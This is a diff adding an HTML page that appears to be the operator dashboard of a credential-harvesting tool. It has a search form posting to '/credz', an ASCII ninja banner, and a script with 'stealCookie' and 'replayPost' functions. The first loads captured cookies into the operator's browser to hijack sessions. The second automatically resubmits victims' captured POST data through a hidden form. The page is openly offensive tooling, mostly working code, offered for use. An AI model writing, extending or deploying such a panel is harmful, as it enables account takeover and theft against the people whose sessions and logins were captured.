@@ -1,0 +1,107 @@
+<html>
+
+<head>
+  <script>
+  function stealCookie(button) {
+    cookies = button.parentNode.parentNode.children[3].innerHTML.split(';');
+    for (i = 0; i < cookies.length; i++) {
+      document.cookie = cookies[i];
+    }
+  }
+
+  function replayPost(button) {
+    var host = button.parentNode.parentNode.children[1].innerHTML.trim()
+    var path = button.parentNode.parentNode.children[2].innerHTML.trim()
+    var data = unescape(button.parentNode.parentNode.children[3].innerHTML).trim().replace(/&amp;/g, '&')
+    var params = data.split('&')
+    var form = document.createElement('form');
+    form.style.visibility = 'hidden'; // no user interaction is necessary
+    form.method = 'POST'; // forms by default use GET query strings
+    form.action = path;
+    for (i=0;i<params.length;i++) {
+      var input = document.createElement('input');
+      input.name = params[i].split('=')[0];
+      input.value = params[i].split('=')[1];
+      form.appendChild(input); // add key/value pair to form
+    }
+    document.body.appendChild(form); // forms cannot be submitted outside of body
+    form.submit(); // send the payload and navigate
+  }
+
+  function pageSetup() {
+    document.getElementById('search_form').action = window.location.href;
+  }
+  </script>
+  <style>
+  table {
+    table-layout: fixed;
+    width: 100%;
+    border: 1px solid black;
+    border-collapse: collapse;
+  }
+  input {
+    width: 100%;
+  }
+  th,td {
+    border: 1px solid black;
+    word-wrap: break-word;
+    white-space: nowrap;
+    overflow: scroll;
+    /*text-overflow: ellipsis;*/
+  }
+  .time {
+    width: 15%;
+  }
+  .domain {
+    width: 20%;
+  }
+   .url {
+    width: 20%;
+  }
+   .data {
+    width: 40%;
+  }
+   .replay {
+    width: 5%;
+  }
+   #banner {
+    color: #17b955;
+  }
+    </style
+</head>
+<body onload="pageSetup()">
+  <div id="logs" style='font-family: "Courier", Serif; generic-family: monospace; width: 100%;'>
+  <div id="banner">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__......._&nbsp;&nbsp;&nbsp;&nbsp;_..--._,--._<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_.--''&nbsp;&nbsp;,&nbsp;,:&nbsp;&nbsp;&nbsp;:``-/&nbsp;&nbsp;:.`&nbsp;(-`,o)``-._&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,-'`::.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;::&nbsp;&nbsp;.:&nbsp;`&nbsp;`-._&nbsp;&nbsp;&nbsp;&nbsp;`--'&nbsp;:.&nbsp;__\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<|><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,-':&nbsp;&nbsp;&nbsp;`::&nbsp;&nbsp;`&nbsp;&nbsp;&nbsp;::&nbsp;,:;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.&nbsp;\&nbsp;&nbsp;:.&nbsp;&nbsp;_.-''&nbsp;&nbsp;/`.______________________________________________/<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,'&nbsp;&nbsp;`:.`&nbsp;&nbsp;::.&nbsp;,&nbsp;&nbsp;&nbsp;`:.::.&nbsp;&nbsp;,&nbsp;&nbsp;`:&nbsp;`.&nbsp;_,'&nbsp;.&nbsp;`&nbsp;,`&nbsp;&nbsp;&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_,'&nbsp;`&nbsp;&nbsp;&nbsp;`:.&nbsp;&nbsp;`::&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`::;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,&nbsp;&nbsp;&nbsp;&nbsp;`&nbsp;__.,.-`<br>
+&nbsp;`-._&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_,'&nbsp;&nbsp;`:&nbsp;&nbsp;&nbsp;.-::-.&nbsp;&nbsp;::&nbsp;&nbsp;`&nbsp;&nbsp;&nbsp;&nbsp;,:&nbsp;&nbsp;,'&nbsp;/.&nbsp;)-'''<br>
+&nbsp;&nbsp;`&nbsp;&nbsp;``--.._,'`:._&nbsp;&nbsp;`:.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,:&nbsp;\&nbsp;`:.___.,::..--/:&nbsp;/&nbsp;/&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.&nbsp;_.-'&nbsp;&nbsp;&nbsp;&nbsp;_.--'``--''`'`.:\'''-`------..(&nbsp;`(._`._____.....---<br>
+-..___,'`:_..-''&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;_&nbsp;&nbsp;&nbsp;-.&nbsp;&nbsp;_\.`.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`:.`.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,`<br>
+&nbsp;&nbsp;&nbsp;&nbsp;,:.&nbsp;,'---...._______&nbsp;&nbsp;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\_.`.&nbsp;-=&nbsp;&nbsp;&nbsp;&nbsp;`&nbsp;&nbsp;,&nbsp;`..\&nbsp;,&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.-&nbsp;&nbsp;_&nbsp;&nbsp;<br>
+&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;,'&nbsp;&nbsp;&nbsp;&nbsp;___&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;```````---`,)'-------....._).`.____,.__....---<br>
+&nbsp;&nbsp;:&nbsp;&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;,',-.:.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;I'm&nbsp;a&nbsp;ninja.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`'`'&nbsp;<br>
+&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;(&nbsp;(&nbsp;&nbsp;&nbsp;\&nbsp;\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No&nbsp;you're&nbsp;not.<br>
+&nbsp;&nbsp;::.:&nbsp;&nbsp;&nbsp;&nbsp;`.:,&nbsp;/./&nbsp;&nbsp;&nbsp;&nbsp;Did&nbsp;you&nbsp;see&nbsp;me&nbsp;do&nbsp;that?<br>
+&nbsp;&nbsp;&nbsp;`.&nbsp;`-..__..'&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Do&nbsp;what?<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`-.::__.:-'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exactly.<br>
+</div>
+<form action="/credz" method="post" id="search_form" autocomplete="off">
+  <table>
+    <tr>
+      <td class='time'><input type="text" name='timestamp' form="search_form">
+      </td>
+      <td class='domain'><input type="text" name='domain' form="search_form">
+      </td>
+      <td class='url'><input type="text" name='url' form="search_form">
+      </td>
+      <td class='data'><input type="text" name='data' form="search_form">
+      </td>
+      <td class='replay'><input type="submit" value="search" form="search_form">
+      </td>
+    </tr>
+  </table>
+</form>
